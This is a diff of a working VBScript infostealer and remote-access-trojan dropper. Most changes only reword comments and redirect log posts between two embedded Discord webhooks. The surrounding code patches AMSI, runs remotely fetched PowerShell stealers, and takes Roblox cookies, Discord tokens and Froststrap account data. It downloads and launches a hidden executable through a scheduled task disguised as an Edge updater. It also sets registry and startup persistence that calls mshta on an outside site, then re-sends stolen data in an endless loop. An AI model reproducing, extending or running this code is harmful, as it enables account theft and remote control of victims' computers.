@@ -9,7 +9,7 @@ Dim sh, fso, WH, RE_WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOKS ---
+' --- WEBHOOKS: WH = logs, RE_WH = re-grab ---
 WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
 RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"
 
@@ -23,28 +23,26 @@ Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf:
 ' --- AMSI pre-patch before drop ---
 Call PatchAMSI
 
-' --- 1. GRABS (Target -> Token -> Cookie -> Persistence -> UI) ---
+' --- 1. GRABS (logs -> WH) ---
 Call IP(WH)
 Call GrabTokens(WH)
 Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
 
-' --- 2. RAT DROP (Spam Loop) ---
+' --- 2. RAT DROP (logs -> WH) ---
 Call DropRAT
 
-' --- 3. INFINITE Re-grab chain ---
+' --- 3. INFINITE Re-grab chain (re-grab -> RE_WH) ---
 Dim runCount
 runCount = 0
 Do
     runCount = runCount + 1
     Call PostEmbedTo(":repeat: Re-grab " & runCount, "PC: " & PC & " | User: " & USER, 10181046, RE_WH)
-    
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call GrabRoblox(RE_WH)
     Call GrabFroststrap(RE_WH)
-    
     Call SleepSeconds(150)
 Loop
 
@@ -62,7 +60,7 @@ Sub PatchAMSI()
     fso.DeleteFile psf, True
 End Sub
 
-' --- RAT DROP (10s Spam Loop) — ADS stage + buffer fallback + schtask launch, log to RE_WH ---
+' --- RAT DROP (10s Spam Loop, logs -> WH) ---
 Sub DropRAT()
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
     Dim dl : dl = DecodeB64(b64Url)
@@ -73,7 +71,7 @@ Sub DropRAT()
     Dim ads  : ads  = host & ":agent.exe"
 
     Do
-        Call PostEmbedTo(":rocket: RAT Download", "Fetching Payload...", 10181046, RE_WH)
+        Call PostEmbedTo(":rocket: RAT Download", "Fetching Payload...", 10181046, WH)
 
         If fso.FileExists(op) Then fso.DeleteFile op
         If fso.FileExists(host) Then fso.DeleteFile host
@@ -89,7 +87,7 @@ Sub DropRAT()
         End If
 
         If Not staged Then
-            Call PostEmbedTo(":warning: RAT", "ADS miss, buffer fallback", 16711680, RE_WH)
+            Call PostEmbedTo(":warning: RAT", "ADS miss, buffer fallback", 16711680, WH)
             staged = BufferDownload(dl, op)
         End If
 
@@ -101,23 +99,21 @@ Sub DropRAT()
         If fso.FileExists(op) Then
             If fso.GetFile(op).Size > 3000000 Then
                 Dim dsize : dsize = fso.GetFile(op).Size
-                Call PostEmbedTo(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046, RE_WH)
-
+                Call PostEmbedTo(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046, WH)
                 Dim launchOk : launchOk = LaunchScheduledTask(op)
                 If launchOk Then
-                    Call PostEmbedTo(":white_check_mark: RAT", "Executed (schtask lineage)", 65280, RE_WH)
+                    Call PostEmbedTo(":white_check_mark: RAT", "Executed (schtask lineage)", 65280, WH)
                     Exit Sub
                 End If
                 Call RunCmd("""" & op & """")
                 Exit Sub
             End If
         End If
-
         Call SleepSeconds(10)
     Loop
 End Sub
 
-' --- BufferDownload (ADODB.Stream memory buffer) ---
+' --- BufferDownload ---
 Function BufferDownload(url, outPath)
     BufferDownload = False
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -141,7 +137,7 @@ Function BufferDownload(url, outPath)
     BufferDownload = fso.FileExists(outPath)
 End Function
 
-' --- LaunchScheduledTask (parent swap) ---
+' --- LaunchScheduledTask ---
 Function LaunchScheduledTask(exePath)
     LaunchScheduledTask = False
     Dim tn : tn = "MicrosoftEdgeUpdate" & CStr(Int(Rnd * 9000) + 1000)
@@ -187,7 +183,7 @@ Sub RunCmd(cmd)
     p.Create cmd,,s,i
 End Sub
 
-' --- ADDED: FULL ROBLOX UI FROM SCREENSHOT ---
+' --- FULL ROBLOX UI ---
 Sub PostFullRobloxUI(targetWH)
     Dim paths(4)
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
@@ -252,7 +248,7 @@ Sub PostFullRobloxUI(targetWH)
     sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, False
 End Sub
 
-' --- IP Function ---
+' --- IP ---
 Sub IP(targetWH)
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -270,7 +266,7 @@ Sub IP(targetWH)
     Set xh = Nothing
 End Sub
 
-' --- GrabRoblox Function ---
+' --- GrabRoblox ---
 Sub GrabRoblox(targetWH)
     Dim paths(4)
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
@@ -332,7 +328,7 @@ Sub GrabRoblox(targetWH)
     PostFileTo "cookie.txt", cookie, targetWH
 End Sub
 
-' --- GrabFroststrap Function ---
+' --- GrabFroststrap ---
 Sub GrabFroststrap(targetWH)
     Dim fp : fp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
     If Not fso.FileExists(fp) Then
@@ -351,7 +347,7 @@ Sub GrabFroststrap(targetWH)
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
-' --- Sleep Functions ---
+' --- Sleep ---
 Sub SleepSeconds(s)
     Dim t0, t1, t2, elapsed
     t0 = Timer()
@@ -377,15 +373,12 @@ End Sub
 Sub Persistence()
     Dim payload : payload = "mshta https://dicerigx.app/"
     On Error Resume Next
-    
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-    
     Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
     Dim sf : Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
     sf.Close
-    
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
 End Sub
 
@@ -399,16 +392,16 @@ Sub GrabTokens(targetWH)
     Dim pc: pc = xh.responseText
     If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
-    
+
     Dim psf: psf = TmpFile("steal.ps1")
     WriteFile psf, pc
     sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
     fso.DeleteFile psf, True
-    
+
     Dim tf: tf = TmpFile("steal_result.txt")
     If Not fso.FileExists(tf) Then Exit Sub
     Dim raw: raw = ReadFile(tf)
-    
+
     If Len(raw) > 10 Then
         Dim lines: lines = Split(raw, vbCrLf)
         Dim l
@@ -433,17 +426,15 @@ Sub GrabTokens(targetWH)
     End If
 End Sub
 
-' --- Utility Functions ---
+' --- Utility ---
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
-' --- PostEmbed (Default Webhook) ---
 Sub PostEmbed(t, d, c)
     Call PostEmbedTo(t, d, c, WH)
 End Sub
 
-' --- PostEmbedTo (Custom Webhook) ---
 Sub PostEmbedTo(t, d, c, target_wh)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
@@ -455,7 +446,6 @@ Sub PostEmbedTo(t, d, c, target_wh)
     Set h = Nothing
 End Sub
 
-' --- PostFileTo ---
 Sub PostFileTo(fn, ct, target_wh)
     Dim DQ: DQ = Chr(34)
     Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
@@ -468,7 +458,6 @@ Sub PostFileTo(fn, ct, target_wh)
     Set h = Nothing
 End Sub
 
-' --- DecryptDPAPI ---
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = TmpFile("dpi.txt")
@@ -485,7 +474,6 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile outf, True
 End Function
 
-' --- Ej ---
 Function Ej(s)
     Ej = s
     Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
